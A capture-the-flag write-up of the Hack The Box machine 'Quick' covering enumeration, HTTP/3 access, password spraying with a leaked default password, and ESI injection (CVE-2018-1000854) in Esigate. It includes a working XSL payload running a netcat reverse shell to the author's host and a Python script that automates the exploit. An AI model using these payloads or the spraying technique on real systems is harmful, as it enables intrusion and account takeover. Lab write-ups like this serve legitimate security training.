---
title: "Quick"
difficulty: Hard
os: Linux
points: 40
rating: 4.3
date: 2020-04-25
avatar: assets/htb/quick.png
htb_url: https://app.hackthebox.com/machines/Quick
---

## Useful Skills and Tools

### Connecting to HTTPS through UDP \(QUIC protocol\)

* quiche \[link\]
* experimental curl features \[link\]
* can also change settings in-browser experimental settings \[link\]

### Upgrading a limited shell to a full TTY

1. Determine the installed version of python with `which python`.
2. Spawn a Bash shell through python's PTY with `python -c 'import pty;pty.spawn("/bin/bash")'`.
3. Hit CTRL+Z to background the shell.
4. Type `stty raw -echo` to enable all input to be sent raw through your reverse shell.
5. Type `fg` to return your shell to the foreground.
6. Enable screen clearing and colors with `export TERM=xterm-256color`

### Creating an SSH tunnel for port forwarding

* -L flag
* link
* example

## Enumeration

### Nmap scan

I kicked things off by running an nmap scan against `<YOUR_IP>`. My usual flags are: `-p-`, a shorthand telling nmap to cover every port, `-sC`, which is equivalent to `--script=default` and fires off nmap's default enumeration scripts at the target, `-sV` for a service scan, and `-oN <name>` to write the results to a file named `<name>`.

```text
kac0@kalimaa:~$ nmap -p- -sC -sV -oN quick.nmap <YOUR_IP>
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-10 14:35 EDT
Nmap scan report for <YOUR_IP>
Host is up (0.055s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)
|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)
|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)
9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                            
|_http-title: Quick | Broadband Services                                                                
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                 

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .          
Nmap done: 1 IP address (1 host up) scanned in 131.16 seconds
```

The TCP scan turned up just two open ports: SSH on the standard port 22 and an Apache web server delivered over HTTP on the unusual port 9001.

Pointing a browser at the HTTP service rendered a site that looked like it belonged to a broadband internet company.  

![](assets/wu/quick/img-1.png)

There was also a roster of current subscribers at `/clients.php`.  

![](assets/wu/quick/img-2.png)

The landing page reads "Upto 17MBps - £18 \| Upto 50MBps - £27", and since the prices are listed in pounds, the provider is probably based in the UK.  Cross-referencing the clients' countries, the company names, and the names in the Testimonials section produced a candidate list of users.  I also noticed that just two clients \(Tim from Qconsulting and Elisa from Wink\) were UK-based, so I flagged them as higher-priority targets for access.

```text
Tim (Qconsulting Pvt Ltd) - UK

Roy (DarkWng Solutions) - US

Elisa (Wink Media) - UK

James (LazyCoop Pvt Ltd) - China
```

That left me with four entries on my shortlist of likely usernames. 

![](assets/wu/quick/img-3.png)

The "Get Started" link took me to a login page at [http://<YOUR_IP>:9001/login.php](http://<YOUR_IP>:9001/login.php). I tried feeding these names in to see whether any produced an error confirming a valid account, but the form expected email addresses instead of usernames, so nothing came of it.

![](assets/wu/quick/fix-23.png)

My dirbuster scan revealed an exposed `db.php`, but I wasn't sure how to interact with it.  Browsing to it just returned a blank page.

![](assets/wu/quick/img-5.png)

The main page contained a link to `portal.quick.htb`, which I added to my `hosts` file.  It appeared to be an identical copy of the first page, except that the `portal.quick.htb` link pointed to an HTTPS site that wouldn't connect.  

While inspecting the requests in Burp I spotted something interesting, though: an HTTP header reading `X-Powered-By: Esigate`.  A bit of digging showed this was a webapp integration backend for the site.  I also learned that the software had exploitable vulnerabilities, but they depended on an exposed form where carefully crafted requests could slip past security controls.  At this stage I had nowhere to test for the issue. [http://www.esigate.org/security/security-01.html](http://www.esigate.org/security/security-01.html) [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)

![](assets/wu/quick/img-6.png)

I also observed that the Apache `server-status` page was reachable, which can lead to a serious information-disclosure issue.  I located exploit code for this at [https://github.com/mazen160/server-status\_PWN](https://github.com/mazen160/server-status_PWN), but this site didn't appear to leak anything useful.

## Nmap redux

This next part was partly spoiled for me by someone pointing out that Nmap only scans TCP by default and that more enumeration was needed.  That hint was enough to nudge me toward a UDP scan to look for additional open ports.  

UDP scans are far, far slower thanks to how the enumeration works.  Open UDP ports are inferred from the absence of any reply to a probe, unlike TCP, where an ACK usually signals an open port and a RST means it's closed.  UDP doesn't use flags the way TCP does and instead leans on ICMP port-unreachable messages to report closed ports. 

If you ever need to scan UDP, I'd suggest doing it in chunks rather than all 65536 ports at once.  This scan also has to be run as root.

```text
root@kali:/home/kac0/htb/quick# nmap --reason -sU -Pn -A -p1-1000 -oN quick.nmap-udp <YOUR_IP>
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-10 18:51 EDT

Nmap scan report for quick.htb (<YOUR_IP>)
Host is up, received user-set (0.052s latency).
Scanned at 2020-08-10 18:51:59 EDT for 1348s
Not shown: 999 closed ports
Reason: 999 port-unreaches
PORT    STATE         SERVICE REASON      VERSION
443/udp open|filtered https   no-response
Too many fingerprints match this host to give specific OS details
TCP/IP fingerprint:
SCAN(V=7.80%E=4%D=8/10%OT=%CT=%CU=1%PV=Y%DS=2%DC=T%G=N%TM=5F31D4D3%P=x86_64-pc-linux-gnu)
SEQ(CI=Z%II=I)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 979/udp)
HOP RTT      ADDRESS
1   76.04 ms 10.10.14.1
2   76.30 ms quick.htb (<YOUR_IP>)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1348.02 seconds
           Raw packets sent: 1444 (43.230KB) | Rcvd: 1157 (70.616KB)
```

One UDP port looked open.  I then researched HTTPS over UDP port 443 and came across articles about the new HTTP/3 protocol.  I recalled reading about HTTPS running over UDP using a protocol called QUIC, but I didn't expect it to already show up in a Hack the Box challenge \(kudos to MrR3boot!\). 

Resources:

*  [https://daniel.haxx.se/http3-explained/](https://daniel.haxx.se/http3-explained/)
*  [https://ec.haxx.se/http/http-http3](https://ec.haxx.se/http/http-http3). 
*  [https://github.com/curl/curl/wiki/QUIC-implementation](https://github.com/curl/curl/wiki/QUIC-implementation)
*  [https://quicwg.org/](https://quicwg.org/)

QUIC powers HTTP/3 and runs over UDP to provide a fast, connectionless "session".  Because most web traffic is just simple request/response exchanges, UDP works fine here, while TCP's extra overhead only adds delay. QUIC is supposedly much faster \(pun intended?\).

This accounts for the broken https:// link on `portal.quick.htb`: the browser expects TCP:443, and most browsers don't yet support the new UDP-based protocol. I looked into which browsers did support it and found [https://caniuse.com/\#feat=http3](https://caniuse.com/#feat=http3).  It turns out browsers like Google Chrome \(or Chromium\) can turn on QUIC via the experimental flags page at `chrome://flags`. [https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj\_l\_YShP40GLQE/edit\#](https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj_l_YShP40GLQE/edit#) 

![](assets/wu/quick/img-7.png)

As noted, browsers like Google Chrome \(or Chromium\) can enable QUIC from the experimental flags page at `chrome://flags`. [https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj\_l\_YShP40GLQE/edit\#](https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj_l_YShP40GLQE/edit#) 

## Building an HTTP/3 version of cURL

While reading up on HTTP/3 and how to check whether a site supports it, I came across [https://geekflare.com/http3-test/](https://geekflare.com/http3-test/).  It referenced a build of cURL compiled from source with support for the protocol, so I pulled the code from the GitHub repo at [https://github.com/curl/curl/blob/master/docs/HTTP3.md\#quiche-version](https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version) and followed the instructions.

```text
quiche version
build
Build quiche and BoringSSL:

 % git clone --recursive https://github.com/cloudflare/quiche
 % cd quiche
 % cargo build --release --features pkg-config-meta,qlog
 % mkdir deps/boringssl/src/lib
 % ln -vnf $(find target/release -name libcrypto.a -o -name libssl.a) deps/boringssl/src/lib/
Build curl:

 % cd ..
 % git clone https://github.com/curl/curl
 % cd curl
 % ./buildconf
 % ./configure LDFLAGS="-Wl,-rpath,$PWD/../quiche/target/release" --with-ssl=$PWD/../quiche/deps/boringssl/src --with-quiche=$PWD/../quiche/target/release --enable-alt-svc
 % make
Run
Use HTTP/3 directly:

curl --http3 https://nghttp2.org:8443/
Upgrade via Alt-Svc:

curl --alt-svc altsvc.cache https://quic.aiortc.org/
```

[https://unix.stackexchange.com/questions/360434/how-to-install-libtoolize](https://unix.stackexchange.com/questions/360434/how-to-install-libtoolize)

After installing Rust \(along with plenty of other dependencies\) I ended up with a fresh experimental curl build that supported HTTP/3. 

_To avoid working out of the install directory, I aliased **`curl3`** to the new curl with **`alias curl3=</install_path/>curl`**_

```markup
kac0@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/
<html>
<title> Quick | Customer Portal</title>
<h1>Quick | Portal</h1>
<head>
<style>
...snipped CSS...
</style>
</head>
<body>
<p> Welcome to Quick User Portal</p>
<ul>
  <li><a href="index.php">Home</a></li>
  <li><a href="index.php?view=contact">Contact</a></li>
  <li><a href="index.php?view=about">About</a></li>
  <li><a href="index.php?view=docs">References</a></li>
</ul>
</html>
```

With this new tool I could fetch the page at [https://portal.quick.htb](https://portal.quick.htb). It listed four pages: `index.php`, `contact`, `about`, and `docs`.  

```markup
kac0@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=contact
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
...snipped CSS...
</style>
</head>
<body>
<h1>Quick | Contact</h1>

<div class="container">
  <form action="/">
    <label for="fname">First Name</label>
    <input type="text" id="fname" name="firstname" placeholder="Your name..">

    <label for="lname">Last Name</label>
    <input type="text" id="lname" name="lastname" placeholder="Your last name..">

    <label for="country">Country</label>
    <select id="country" name="country">
      <option value="australia">Australia</option>
      <option value="canada">Canada</option>
      <option value="usa">USA</option>
    </select>

    <label for="subject">Subject</label>
    <textarea id="subject" name="subject" placeholder="Write something.." style="height:200px"></textarea>

    <input type="submit" value="Submit">
  </form>
</div>

</body>
</html>
```

The `/contact` page seemed to be unfinished and held nothing of value.

```markup
kac0@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=about
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
...snipped CSS...
</style>
</head>
<body>

<div class="about-section">
  <h1>Quick | About Us </h1>
</div>

<h2 style="text-align:center">Our Team</h2>
<div class="row">
  <div class="column">
    <div class="card">
      <div class="container">
        <h2>Jane Doe</h2>
        <p class="title">CEO & Founder</p>
        <p>Quick Broadband services established in 2012 by Jane.</p>
        <p>jane@quick.htb</p>
      </div>
    </div>
  </div>

  <div class="column">
    <div class="card">
      <div class="container">
        <h2>Mike Ross</h2>
        <p class="title">Sales Manager</p>
        <p>Manages the sales and services.</p>
        <p>mike@quick.htb</p>
      </div>
    </div>
  </div>

  <div class="column">
    <div class="card">
      <div class="container">
        <h2>John Doe</h2>
        <p class="title">Web Designer</p>
        <p>Front end developer.</p>
        <p>john@quick.htb</p>
      </div>
    </div>
  </div>
</div>

</body>
</html>
```

The `/about` page yielded three possible users along with useful email addresses: Jane Doe `jane@quick.htb`, Mike Ross `mike@quick.htb`, and John Doe `john@quick.htb`.  

```markup
kac0@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=docs
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">

<h1>Quick | References</h1>
<ul>
  <li><a href="docs/QuickStart.pdf">Quick-Start Guide</a></li>
  <li><a href="docs/Connectivity.pdf">Connectivity Guide</a></li>
</ul>
</head>
</html>
```

The `/docs` page pointed to two PDF files. I grabbed them to see whether they held any more juicy details.

```text
kac0@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/docs/QuickStart.pdf --output quickstart.pdf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  228k  100  228k    0     0   668k      0 --:--:-- --:--:-- --:--:--  666k
kac0@kalimaa:~/htb/quick$ curl3 --http3 https://portal.quick.htb/docs/Connectivity.pdf --output connectivity.pdf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 83830  100 83830    0     0   258k      0 --:--:-- --:--:-- --:--:--  257k
```

Both PDFs came down without a hitch using the new cURL build. The `Connectivity.pdf` file held something interesting!

![](assets/wu/quick/img-8.png)

It seems this broadband provider hands customers a default password for logging into their accounts.  I was hoping one of the clients had been lazy enough to reuse that same password on the portal and never change it.  

`Connectivity.pdf` also included a link back to the first site, `http://quick.htb`, whereas the other document linked to the HTTPS version. I figured this might be a hint to log in on the first site.

Working out how to log in took a bit of guesswork, since the only email addresses I had clues for were the three `@quick.htb` ones. I first cycled through all the names I'd collected with `@quick.htb` appended, but that failed. Then, given that company names and countries were provided for each user, I decided to build candidate email addresses from those.

```text
kac0@kali:~/htb/quick$ wfuzz -w users -c -X POST -u 'http://quick.htb:9001/login.php' -d 'email=FUZZ&password=Quick4cc3$$'

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************
Target: http://quick.htb:9001/login.php
Total requests: 7
===================================================================
ID           Response   Lines    Word     Chars       Payload                                
===================================================================

000000003:   200        0 L      2 W      80 Ch       "james@lazycoop.co.cn"                 
000000001:   200        0 L      2 W      80 Ch       "tim@Qconsulting.co.uk"                
000000002:   302        0 L      0 W      0 Ch        "elisa@wink.co.uk"                     
000000004:   200        0 L      2 W      80 Ch       "roy@DarkWng.com"                      
000000005:   200        0 L      2 W      80 Ch       "jane@quick.htb"                       
000000006:   200        0 L      2 W      80 Ch       "mike@quick.htb"                       
000000007:   200        0 L      2 W      80 Ch       "john@quick.htb"                       

Total time: 0.105150
Processed Requests: 7
Filtered Requests: 0
Requests/sec.: 66.57097
```

I fed my candidate email list into wfuzz and used it to spray usernames against the site.  My hunch paid off! The 302 response above told me I had a valid login for `elisa@wink.co.uk`! _Honestly, I'm surprised only one user logged in with the default password they were given! :P_

```http
POST /login.php HTTP/1.1
Host: quick.htb:9001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://quick.htb:9001/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Connection: close
Cookie: PHPSESSID=nl56u8c71du29c6v8rafi3h23k
Upgrade-Insecure-Requests: 1
DNT: 1

email=elisa%40wink.co.uk&password=Quick4cc3%24%24
```

I captured the login credentials in Burp so I could replay them whenever needed.

## Initial Foothold

![](assets/wu/quick/img-9.png)

With access to the portal, I could now reach the `/home`, `/ticket`, and `/search` pages I'd seen earlier in my dirbuster output. 

![](assets/wu/quick/img-10.png)

The ticketing page had an input field that returned a ticket number once I submitted it.

![](assets/wu/quick/img-11.png)

Now that I had input fields to work with, I decided to test the Esigate vulnerability I'd read about earlier to see whether it was exploitable. It carries the identifier CVE-2018-1000854. [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/) [https://github.com/esigate/esigate/issues/209](https://github.com/esigate/esigate/issues/209) 

```text
kac0@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
Serving HTTP on 0.0.0.0 port 9088 ...
<YOUR_IP> - - [11/Aug/2020 21:15:36] "GET /evil.xsl HTTP/1.1" 200 -
```

Following the blog's instructions, I built an XSL file containing specially formed XML that Esigate would read and execute once it was reflected into an XML file.

![](assets/wu/quick/img-12.png)

I submitted the code above to the ticketing system, prompting Esigate to load the `evil.xml` file with my `evil.xsl` payload reflected into it as a "stylesheet". 

```markup
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
	<xsl:variable name="cmd"><![CDATA[./nc -e /bin/sh 10.10.15.57 13371]]></xsl:variable>
	<xsl:variable name="rtObj" select="rt:getRuntime()"/>
	<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
	Process: <xsl:value-of select="$process"/>
	Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>
```

![](assets/wu/quick/img-13.png)

![](assets/wu/quick/img-14.png)

A bit of testing confirmed the vulnerability did live in the ticket search function!  After I submitted my "ticket", searching for its number made Esigate read and execute the code in the malicious XML file.

```text
kac0@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
Serving HTTP on 0.0.0.0 port 9088 ...
<YOUR_IP> - - [11/Aug/2020 21:35:46] code 404, message File not found
<YOUR_IP> - - [11/Aug/2020 21:35:46] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
<YOUR_IP> - - [11/Aug/2020 21:47:27] code 404, message File not found
<YOUR_IP> - - [11/Aug/2020 21:47:27] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
<YOUR_IP> - - [11/Aug/2020 21:47:41] code 404, message File not found
<YOUR_IP> - - [11/Aug/2020 21:47:41] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
<YOUR_IP> - - [11/Aug/2020 21:47:47] code 404, message File not found
<YOUR_IP> - - [11/Aug/2020 21:47:47] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
<YOUR_IP> - - [11/Aug/2020 21:53:58] code 404, message File not found
<YOUR_IP> - - [11/Aug/2020 21:53:58] "GET http://10.10.15.57:9088/evil.xsl HTTP/1.1" 404 -
<YOUR_IP> - - [11/Aug/2020 21:59:59] "GET /test.xsl HTTP/1.1" 200 -
<YOUR_IP> - - [11/Aug/2020 21:59:59] "GET /test.xml HTTP/1.1" 200 -
<YOUR_IP> - - [11/Aug/2020 22:03:31] code 404, message File not found
<YOUR_IP> - - [11/Aug/2020 22:03:31] "GET http://10.10.15.57:9088/test.xsl HTTP/1.1" 404 -
<YOUR_IP> - - [11/Aug/2020 22:06:43] "GET /test1.xsl HTTP/1.1" 200 -
<YOUR_IP> - - [11/Aug/2020 22:06:44] "GET /test1.xml HTTP/1.1" 200 -
```

After plenty of head-scratching and trial and error, I realized each filename could only be used once. Afterward it would throw a 404 even for files that clearly existed on my local python server. I couldn't pin down the cause, but it had to be something on the server's end.

```text
kac0@kali:~/htb/quick$ nc -lvnp 13371 > passwd
listening on [any] 13371 ...
connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 43030
```

In one test I tried to coax the server into sending me `/etc/passwd`, but the resulting file was empty. Trying it another way, I concluded the command was being blocked so nothing got sent.  What mattered was that my test exploit clearly worked.

Next I wrote a python script to automate the file upload and ticket-search trigger steps.

```python
#!/usr/bin/env python3
#coding: utf8
#Created by kac0 (WolfZweiler) for CVE-2018-1000854 (as exposed in HTB - quick)

import requests
from bs4 import BeautifulSoup
import time
import sys

login_url = "http://quick.htb:9001/login.php"
login_data = 'email=elisa@wink.co.uk&password=Quick4cc3$$'
login_headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Cookie': 'PHPSESSID=03u65s156tk17dfddsi28m7rld', 
    'Referer': 'http://quick.htb:9001/login.php',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Host': 'quick.htb:9001'}

ticket_url = "http://quick.htb:9001/ticket.php"
ticket_headers = {
    'Host': 'quick.htb:9001',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://quick.htb:9001/ticket.php',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'PHPSESSID=03u65s156tk17dfddsi28m7rld'}

esi1 = 'title=evil&msg="<esi:include src="http://10.10.15.10:1337/evil.xml" stylesheet="http://10.10.15.10:1337/evil.xsl"></esi:include>"&id=TKT-1234'
esi2 = 'title=evil1&msg="<esi:include src="http://10.10.15.10:1337/evil1.xml" stylesheet="http://10.10.15.10:1337/evil1.xsl"></esi:include>"&id=TKT-2345'
esi3 = 'title=evil2&msg="<esi:include src="http://10.10.15.10:1337/evil2.xml" stylesheet="http://10.10.15.10:1337/evil2.xsl"></esi:include>"&id=TKT-3456'

ticGet1_url = 'http://quick.htb:9001/search.php?search=1234'
ticGet2_url = 'http://quick.htb:9001/search.php?search=2345'
ticGet3_url = 'http://quick.htb:9001/search.php?search=3456'
ticGet_headers = {
    'Host': 'quick.htb:9001',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://quick.htb:9001/home.php',
    'X-Requested-With': 'XMLHttpRequest',
    'Connection': 'close',
    'Cookie': 'PHPSESSID=03u65s156tk17dfddsi28m7rld',
    'DNT': '1'}

esi1_r, esi2_r, esi3_r = None, None, None

login_r = requests.post(login_url, headers = login_headers, data = login_data)
#login_r.status_code should be == 302, however this login request is not working correctly
#need to further troubleshoot; for now bypassed by logging in with burp
if login_r.status_code == 200:
    print("Login successful!\n")
    esi1_r = requests.post(ticket_url, headers = ticket_headers, data = esi1)
    time.sleep(1)
    ticGet1_r = requests.get(ticGet1_url, headers = ticGet_headers)
    time.sleep(1)
else:
    print("The request failed with status code: " + str(login_r.status_code))
    print("Did not login successfully :(\n")
    print("Dumping response text:\n\n")
    print(login_r.text)
    sys.exit()

if esi1_r.status_code == 200:
    print("Evil1 upload successful!\n")
    esi2_r = requests.post(ticket_url, headers = ticket_headers, data = esi2)
    time.sleep(1)
    ticGet2_r = requests.get(ticGet2_url, headers = ticGet_headers)
    time.sleep(1)
else:
    print("The request failed with status code: " + str(esi1_r.status_code))
    print("Did not upload evil1 successfully :(\n")
    sys.exit()

if esi2_r.status_code == 200:
    print("Evil2 upload successful!\n")
    esi3_r = requests.post(ticket_url, headers = ticket_headers, data = esi3)
    time.sleep(1)
    ticGet3_r = requests.get(ticGet3_url, headers = ticGet_headers)
else:
    print("The request failed with status code: " + str(esi2_r.status_code))
    print("Did not upload evil2 successfully :(\n")
    sys.exit()

if esi3_r.status_code == 200:
    print("Evil3 upload successful!\n")
    print("Check your nc listener...shell should be inbound!\n")
else:
    print("The request failed with status code: " + str(esi3_r.status_code))
    print("Did not upload evil3 successfully :(\n")

```

I ran the script with three separate ESL files.  Each carried commands designed to get me a reverse shell.  The first delivered a build of `nc` capable of running a command on connect.  The second ran `chmod +x nc` to make it executable. The third held my reverse shell command to call back to my machine.  I staged all the files under different filenames, kicked off the script, and crossed my fingers that it would all come together.

```text
kac0@kali:~/htb/quick$ python3 auto-evil.py 
Login successful!

Ticket submitted: code - 200
Evil1 upload successful!

Ticket submitted: code - 200
Evil2 upload successful!

Ticket submitted: code - 200
Evil3 upload successful!

Check your nc listener...shell should be inbound!
```

It all appeared to finish without errors...

```text
kac0@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
Serving HTTP on 0.0.0.0 port 9088 ...
<YOUR_IP> - - [15/Aug/2020 12:24:41] "GET /evil.xsl HTTP/1.1" 200 -
<YOUR_IP> - - [15/Aug/2020 12:24:42] "GET /evil.xml HTTP/1.1" 200 -
<YOUR_IP> - - [15/Aug/2020 12:24:42] "GET /nc HTTP/1.1" 200 -
<YOUR_IP> - - [15/Aug/2020 12:24:45] "GET /evil1.xsl HTTP/1.1" 200 -
<YOUR_IP> - - [15/Aug/2020 12:24:45] "GET /evil1.xml HTTP/1.1" 200 -
<YOUR_IP> - - [15/Aug/2020 12:24:47] "GET /evil2.xsl HTTP/1.1" 200 -
<YOUR_IP> - - [15/Aug/2020 12:24:47] "GET /evil2.xml HTTP/1.1" 200 -
```

All my files uploaded successfully...

```text
kac0@kalimaa:~/htb/quick$ nc -lvnp 13371
listening on [any] 13371 ...
connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 39638
whoami && hostname
sam
quick
which python                   
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")'
sam@quick:~$ ^Z
[1]+  Stopped                 nc -lvnp 13371
kac0@kali:~/htb/quick$ stty raw -echo
kac0@kali:~/htb/quick$ nc -lvnp 13371

sam@quick:~$ export TERM=xterm-256color
```

And... I was in.  A limited shell landed at my waiting listener, which I promptly upgraded to a fully interactive Bash shell with python.

## User.txt

My first move after getting access was to grab the proof.

```text
sam@quick:~$ cat user.txt 
b57f************************bd59
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as `sam`

The first thing I check after landing an account on a box is what privileges are available, via `sudo -l`.  Unfortunately there was nothing I could run without the password.

```text
sam@quick:~/esigate-distribution-5.2$ ls -la
total 20
drwxr-xr-x  5 sam sam 4096 Mar 20 03:01 .
drwxr-xr-x  6 sam sam 4096 Aug 15 16:44 ..
drwxr-xr-x  3 sam sam 4096 Aug 15 16:41 apps
drwxr-xr-x  2 sam sam 4096 Oct 11  2017 lib
drwxr-xr-x 18 sam sam 4096 Oct 11  2017 src

sam@quick:~/esigate-distribution-5.2$ ls -la apps/
total 9492
drwxr-xr-x 3 sam sam    4096 Aug 15 15:33 .
drwxr-xr-x 5 sam sam    4096 Mar 20 03:01 ..
-rw-r--r-- 1 sam sam      63 Mar 20 03:01 esigate.properties
-rw-r--r-- 1 sam sam 6700842 Oct 11  2017 esigate-server.jar
-rw-r--r-- 1 sam sam 3000503 Oct 11  2017 esigate-war.war
drwxrwxr-x 3 sam sam    4096 Aug 15 15:33 work

sam@quick:~/esigate-distribution-5.2$ ls -la lib/
total 2792
drwxr-xr-x 2 sam sam   4096 Oct 11  2017 .
drwxr-xr-x 5 sam sam   4096 Mar 20 03:01 ..
-rw-r--r-- 1 sam sam 263965 Mar 10  2016 commons-codec-1.9.jar
-rw-r--r-- 1 sam sam 159509 Mar 11  2011 commons-io-2.0.1.jar
-rw-r--r-- 1 sam sam 412739 Jan 19  2016 commons-lang3-3.3.2.jar
-rw-r--r-- 1 sam sam   4981 Oct 11  2017 esigate-cas-5.2.jar
-rw-r--r-- 1 sam sam 314645 Oct 11  2017 esigate-core-5.2.jar
-rw-r--r-- 1 sam sam  24225 Oct 11  2017 esigate-servlet-5.2.jar
-rw-r--r-- 1 sam sam 295791 Oct 20  2012 htmlparser-1.4.jar
-rw-r--r-- 1 sam sam 736658 May 18  2016 httpclient-4.5.2.jar
-rw-r--r-- 1 sam sam 158984 May 18  2016 httpclient-cache-4.5.2.jar
-rw-r--r-- 1 sam sam 326724 May 18  2016 httpcore-4.4.4.jar
-rw-r--r-- 1 sam sam  16519 Sep 25  2014 jcl-over-slf4j-1.7.7.jar
-rw-r--r-- 1 sam sam  85448 Apr 24  2014 metrics-core-3.0.2.jar
-rw-r--r-- 1 sam sam  29257 Sep 11  2015 slf4j-api-1.7.7.jar

sam@quick:~/esigate-distribution-5.2$ ls -la src/
total 72
drwxr-xr-x 18 sam sam 4096 Oct 11  2017 .
drwxr-xr-x  5 sam sam 4096 Mar 20 03:01 ..
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-app-aggregated1
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-app-aggregated2
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-app-aggregator
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-app-cas
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-app-casified-aggregated1
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-app-casified-aggregated2
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-app-casified-aggregator
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-app-master
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-app-provider
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-cas
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-core
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-distribution
drwxr-xr-x  3 sam sam 4096 Oct 11  2017 esigate-server
